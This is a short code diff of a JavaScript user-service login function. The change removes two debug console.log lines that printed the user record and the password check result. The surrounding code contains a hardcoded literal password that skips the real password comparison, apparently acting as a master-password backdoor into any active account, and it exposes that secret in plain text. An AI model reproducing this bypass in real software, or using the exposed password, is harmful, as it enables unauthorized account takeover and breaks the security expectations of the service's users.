@@ -57,11 +57,9 @@ module.exports = class UserService{
         active: true
       }
     })
-    console.log(user)
     if(user){
         if(requestBody.password != 'fryt01Ch1ck3n'){
           var result = await user.comparePassword(requestBody.password)
-          console.log("Password is",result)
           if(result == null ){
             return {
               error:{
